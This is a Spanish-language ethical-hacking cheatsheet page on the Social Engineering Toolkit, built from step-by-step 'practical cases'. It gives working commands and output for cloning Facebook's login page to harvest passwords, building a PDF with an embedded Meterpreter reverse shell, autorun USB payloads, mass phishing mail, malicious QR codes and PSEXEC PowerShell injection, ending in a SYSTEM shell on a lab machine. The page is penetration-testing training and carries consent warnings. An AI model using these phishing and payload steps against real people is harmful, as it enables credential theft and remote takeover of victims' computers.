
# Social Engineering Toolkit

**Social Engineering Toolkit (SET)** es una herramienta de código abierto diseñada para **pruebas de ingeniería social**. Fue creada por **TrustedSec** y está integrada en **Kali Linux**. Permite ejecutar una gran variedad de ataques, como **phishing, clonación de sitios web, explotación de redes sociales, etc.**

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a realizar ataques de phishing para conseguir datos sensibles como la ubicación de una persona, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">**Instalación y ejecución**</mark>

Social Egineering Tookit viene preinstalado en Kali Linux, pero si no tienes instalado, puedes instalarlo con:

```bash
sudo apt update && sudo apt install set
```

```bash
sudo setoolkit
```

Aparecerá un **menú interactivo** con múltiples opciones.

<figure><img src="/files/VbB2iH5wJFsaXHgC2gjs" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">**Menú Principal de SEToolkit**</mark>

Cuando inicias SET, verás un menú con varias opciones:

```bash
 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 
```

Cada opción tiene submenús con funcionalidades específicas. Vamos a explicar **cada una con un caso práctico.**

***

## <mark style="color:purple;">**1. Social-Engineering Attacks**</mark>

Es el módulo principal y más utilizado en SET. Incluye los siguientes ataques:

### <mark style="color:purple;">**Website Attack Vectors**</mark>

Permite clonar sitios web y capturar credenciales mediante páginas falsas.

> #### **Caso Práctico: Clonar Facebook para capturar credenciales**

1. Seleccionamos:

```bash
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
```

2. Elegimos clonar un sitio web:

```bash
2) Site Cloner
```

3. Ingresamos nuestra IP (o localhost si es en pruebas):

```
192.168.1.181
```

4. Ingresamos la URL del sitio a clonar (p.e. Facebook):

```url
https://www.facebook.com/login
```

SET crea una página clonada que captura las credenciales ingresadas. Podemos acceder a través de `localhost:80` (o la IP que hayamos introducido). También podríamos usar [Ngrok](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-redes/phising/seeker-y-ngrok#ngrok) para compartir ese link de localhost con usuarios fuera de nuestra red.

✅ **Resultado**: Cuando la víctima introduce sus credenciales, aparecen en nuestra terminal.

<figure><img src="/files/70WusjAkQiopHsLJkZqJ" alt=""><figcaption></figcaption></figure>

Automáticamente se nos genera un reporte en la ruta `/root/.set/reports`

{% code overflow="wrap" %}

```bash
┌──(root㉿kali)-[~/.set/reports]
└─ cat 2025-02-17\ 17:40:48.034961.xml | grep PASSWORD
                                                                                                                                                                       
┌──(root㉿kali)-[~/.set/reports]
└─ cat 2025-02-17\ 17:40:48.034961.xml | grep pass    
      <param>had_password_prefilled=false</param>
      <param>encpass=#PWD_BROWSER:5:1739813876:AY1QAOcoUE5YISZI19duCVZA3XqTfzeAjXuUCy6fqJpLxHcfWepI4f4xtrE3tm8laanhWJ1DRvkTN/EmXPnbovVLsvSnJ6ooIo4k28k+MlvVr5guv65Pq1mz0CsiVWTayj50ueqo40oyoGmNpHefrY/snSuLi9/i6KMz</param>
```

{% endcode %}

{% hint style="warning" %}
**Nota**: Si la web que clonamos es https las contraseñas estarán encriptadas. Una opción para evitar esto sería usar las plantillas que incluye setoolkit por defecto en vez de el site cloner.
{% endhint %}

***

### <mark style="color:purple;">**Spear-Phishing Attack Vectors**</mark>

Permite crear correos electrónicos falsos con archivos adjuntos maliciosos.

> #### **Caso Práctico: Enviar un PDF malicioso a la víctima**

1. Seleccionamos:

```bash
1) Social-Engineering Attacks
1) Spear-Phishing Attack Vectors
2) Create a FileFormat Payload
```

2. Seleccionamos un tipo de archivo (por ejemplo un PDF):

```bash
13) Adobe PDF Embedded EXE Social Engineering
```

Podemos usar un pdf que tengamos en nuestra máquina o crear un `blank pdf`:

```bash
[-] Default payload creation selected. SET will generate a normal PDF with embedded EXE.

    1. Use your own PDF for attack
    2. Use built-in BLANK PDF for attack
```

3. Seleccionamos un payload:

```bash
set:payloads> 2

   1) Windows Reverse TCP Shell              Spawn a command shell on victim and send back to attacker
   2) Windows Meterpreter Reverse_TCP        Spawn a Meterpreter shell on victim and send back to attacker
   3) Windows Reverse VNC DLL                Spawn a VNC server on victim and send back to attacker
   4) Windows Reverse TCP Shell (x64)        Windows X64 Command Shell, Reverse TCP Inline
   5) Windows Meterpreter Reverse_TCP (X64)  Connects back to the attacker (Windows x64), Meterpreter
   6) Windows Shell Bind_TCP (X64)           Execute payload and create an accepting port on remote system
   7) Windows Meterpreter Reverse HTTPS      Tunnel communication over HTTP using SSL and use Meterpreter
```

Para este ejemplo usaremos la opción:

```bash
2) Windows Meterpreter Reverse_TCP 
```

4. Seleccionamos la IP y puerto (por defecto `localhost:443`):

```bash
set> IP address or URL (www.ex.com) for the payload listener (LHOST) [192.168.1.181]: 
set:payloads> Port to connect back on [443]: 
[-] Defaulting to port 443...
[*] All good! The directories were created.
[-] Generating fileformat exploit...
[*] Waiting for payload generation to complete (be patient, takes a bit)...
[*] Payload creation complete.
[*] All payloads get sent to the template.pdf directory
[*] If you are using GMAIL - you will need to create an application password: https://support.google.com/accounts/answer/6010255?hl=en
```

Podemos renombrar el archivo o dejarlo por defecto. Este archivo se guarda en la ruta `/root/.set`

```bash
┌──(root㉿kali)-[/home/kali]
└─ cd /root/.set
                                                                             
┌──(root㉿kali)-[~/.set]
└─ ls
exploit.pdf      
```

6. También podemos usar este módulo de Metasploit como alternativa para generar PDFs maliciosos:

```bash
msfconsole -q -x "use exploit/windows/fileformat/adobe_pdf_embedded_exe; set FILENAME exploit.pdf; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 443; exploit"
```

```bash
msfconsole
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set FILENAME exploit.pdf
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 443
exploit

[*] Reading in '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
[*] Parsing '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
[*] Using 'windows/meterpreter/reverse_tcp' as payload...
[+] Parsing Successful. Creating 'exploit.pdf' file...
[+] exploit.pdf stored at /home/kali/.msf4/local/exploit.pdf
```

En este ejemplo lo moveré  a `/home/kali` para enviarlo con un servidor local en python a una máquina Windows:

```bash
┌──(root㉿kali)-[~/.set]
└─ mv exploit.pdf /home/kali

┌──(root㉿kali)-[~/.set]
└─ su kali
```

```shell-session
afsh4ck@kali$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

5. Abrimos un multi handler con Metasploit para quedarnos a la escucha:

```bash
msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.181; set LPORT 443; run"
```

```bash
msf6 exploit(multi/handler) > set lhost 192.168.1.181
msf6 exploit(multi/handler) > set lport 443
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp  
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.181:4444 
```

6. Enviamos el PDF a la víctima por email (o como queramos).

✅ **Resultado**: Cuando la víctima abre el PDF, se ejecuta un reverse shell hacia nuestra máquina.

***

### <mark style="color:purple;">**Infectious Media Generator**</mark>

Sirve para generar medios USB/CD con payloads maliciosos que se ejecutan automáticamente al conectarlo a un equipo.

> #### **Caso Práctico: Crear un USB con un payload para obtener una reverse shell**

1. Seleccionamos:

```bash
1) Social-Engineering Attacks
3) Infectious Media Generator
```

2. Elegimos el tipo de vector, en este ejemplo `Standard Metasploit Executable`:

```bash
1) File-Format Exploits
2) Standard Metasploit Executable
```

2. **Elegimos el payload** (ejemplo: Meterpreter)
3. Introducimos la IP y puerto del nuestro listener:

```
set:payloads> IP address for the payload listener (LHOST): 192.168.1.181
set:payloads> Enter the PORT for the reverse listener: 4444
[*] Generating the payload.. please be patient.
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
[*] Your attack has been created in the SET home directory (/root/.set/) folder 'autorun'
[*] Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.
[-] Copy the contents of the folder to a CD/DVD/USB to autorun
```

4. **Copiamos los archivos generados a un USB:**

```bash
┌──(root㉿kali)-[~/.set]
└─ ls
autorun      payload.exe  payload.options  template.pdf  version.lock
meta_config  payloadgen   set.options      template.rc
                                                                             
┌──(root㉿kali)-[~/.set]
└─ cd autorun     
                                                                             
┌──(root㉿kali)-[~/.set/autorun]
└─ ls
autorun.inf  program.exe
```

5. **Cuando la víctima conecta el USB, ejecuta el payload sin saberlo**.

✅ **Resultado**: Accedemos a la máquina de la víctima con una sesión de Meterpreter.

***

### <mark style="color:purple;">**Crear un Payload y Listener**</mark>

Genera ejecutables maliciosos y configura un listener para capturar conexiones.

> #### **Caso Práctico: Crear un payload en .exe y recibir un Meterpreter**

{% hint style="success" %}
Vamos a poner a prueba esta técnica contra la máquina [Metasploitable 3 Windows](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md).
{% endhint %}

1. Seleccionamos:

```bash
1) Social-Engineering Attacks
4) Create a Payload and Listener
```

2. Elegimos el payload:

```
2) Windows Meterpreter Reverse TCP
```

3. Ingresamos nuestra IP y puerto y nos genera el ejecutable

```
set:payloads> IP address for the payload listener (LHOST): 192.168.1.181 
set:payloads> Enter the PORT for the reverse listener: 4444
[*] Generating the payload.. please be patient.
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
set:payloads> Do you want to start the payload and listener now? (yes/no): yes
[*] Launching msfconsole, this could take a few to load. Be patient...
```

Nos lo genera en la ruta `/root/.set/payload.exe`

4. Compartimos el ejecutable con la víctima. En este ejemplo lo moveré  a `/home/kali` para enviarlo con un servidor local en python a la máquina Metasploitable Windows:

```bash
┌──(root㉿kali)-[~/.set]
└─ mv payload.exe /home/kali

┌──(root㉿kali)-[~/.set]
└─ su kali
```

```shell-session
afsh4ck@kali$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

5. Abrimos un listener con multi handler de Metasploit:

```bash
msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.181; set LPORT 4444; run"
```

✅ **Resultado**: Cuando la víctima ejecuta el archivo, obtenemos acceso remoto a su máquina.

<figure><img src="/files/lAfwWeZ4E8ZYpzLLHH2p" alt=""><figcaption></figcaption></figure>

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.181:4444 
[*] Sending stage (177734 bytes) to 192.168.1.197
[*] Meterpreter session 1 opened (192.168.1.181:4444 -> 192.168.1.197:49285) at 2025-02-17 18:43:39 +0000

meterpreter > getuid
Server username: VAGRANT-2008R2\Administrator

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

***

### <mark style="color:purple;">**Mass Mailer Attack**</mark>

Envía correos electrónicos masivos con phishing.

> #### **Caso Práctico: Enviar correos falsos de soporte técnico**

1. **Seleccionamos**:

```bash
1) Social-Engineering Attacks
5) Mass Mailer Attack
```

2. **Escribimos el mensaje con un enlace malicioso**.
3. **Enviamos el correo masivo**.

✅ **Resultado**: Si los usuarios hacen clic, podemos obtener credenciales o redirigirlos a un exploit.

***

### <mark style="color:purple;">**QR Code Attack Vector**</mark>

Crea un QR malicioso para usarlo con ingeniería social.

> #### **Caso Práctico: Crear un código QR malicioso**

1. **Seleccionamos**:

```bash
1) Social-Engineering Attacks
8) QRCode Generator Attack Vector
```

2. Introducimos la URL maliciosa

```
set> 8

The QRCode Attack Vector will create a QRCode for you with whatever URL you want.

When you have the QRCode Generated, select an additional attack vector within SET and
deploy the QRCode to your victim. For example, generate a QRCode of the SET Java Applet
and send the QRCode via a mailer.

Enter the URL you want the QRCode to go to (99 to exit): https://h4ckercademy.com
[*] QRCode has been generated under /root/.set/reports/qrcode_attack.png
```

Esto nos crea un QR en PNG en la ruta: `/root/.set/reports/qrcode_attack.png`

```bash
┌──(root㉿kali)-[~/.set/reports]
└─ ls
qrcode_attack.png
```

3. Al abrir el QR podemos redirigir a usuarios a una URL de phising. En este ejemplo abre la web de mi academia [h4ckercademy.com](<https://h4ckercademy.com >) pero podríamos usar la URL que quisiéramos:

<figure><img src="/files/M24yxiimKHAN3HojwVsp" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">**2. Penetration Testing (Fast-Track)**</mark>

Este módulo permite automatizar exploits.

> #### **Caso Práctico: Explotar una máquina Windows con MS08-067**

{% hint style="success" %}
Vamos a poner a prueba esta técnica contra la máquina [Metasploitable 3 Windows](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md).
{% endhint %}

1. **Seleccionamos**:

```bash
2) Penetration Testing (Fast-Track)
```

2. **Elegimos el tipo de ataque:**

```bash
1) Microsoft SQL Bruter
2) Custom Exploits
3) SCCM Attack Vector
4) Dell DRAC/Chassis Default Checker
5) RID_ENUM - User Enumeration Attack
6) PSEXEC Powershell Injection
```

* Para este ejemplo vamos a usar `PSEXEC Powershell Injection`:

```bash
6) PSEXEC Powershell Injection
```

3. Ingresamos la IP del objetivo, el nombre de usuario y la contraseña:

```shell-session
set:psexec> Enter the IP Address or range (RHOSTS) to connect to: 192.168.1.197
set:psexec> Enter the username: vagrant
set:psexec> Enter the password or the hash: vagrant
set:psexec> Enter the domain name (hit enter for logon locally): 
set:psexec> How many threads do you want [enter for default]: 
set> IP address or URL (www.ex.com) for the payload listener (LHOST) [192.168.1.181]: 
set:powershell> Enter the port for the reverse [443]: 
[*] Prepping the payload for delivery and injecting alphanumeric shellcode...
[*] Generating x86-based powershell injection code...
[*] Reverse_HTTPS takes a few seconds to calculate..One moment..
No encoder specified, outputting raw payload
Payload size: 394 bytes
Final size of c file: 1687 bytes
[*] Finished generating powershell injection bypass.
[*] Encoded to bypass execution restriction policy...
[*] If you want the powershell commands and attack, they are exported to /root/.set/reports/powershell
[*] Launching Metasploit.. This may take a few seconds.
```

2. **SET lanza el exploit automáticamente**.

✅ **Resultado**: Obtenemos acceso remoto a la máquina de la víctima.

***

## <mark style="color:purple;">**3. Third Party Modules**</mark>

Permite integrar herramientas de terceros en SET.

> #### **Caso Práctico: Usar un módulo de externo**

**Seleccionamos**:

```
3) Third Party Modules
```

1. **Ejecutamos un módulo externo**.

✅ **Resultado**: Podemos lanzar ataques personalizados sin salir de SET.

***

## <mark style="color:purple;">**4. Actualizar SE Toolkit**</mark>

Actualiza SET a la última versión:

```bash
4) Update the Social-Engineer Toolkit
5) Update SET configuration
```

***

## <mark style="color:purple;">**Conclusión**</mark>

SEToolkit es una de las herramientas más poderosas para **ingeniería social** y **auditorías de seguridad**. Su uso debe ser **ético y con autorización**.

Si trabajas en **ciberseguridad**, puedes usar SET para **simular ataques** y educar a los usuarios sobre **cómo defenderse del phishing, ataques USB y otras técnicas de ingeniería social**. 🚀
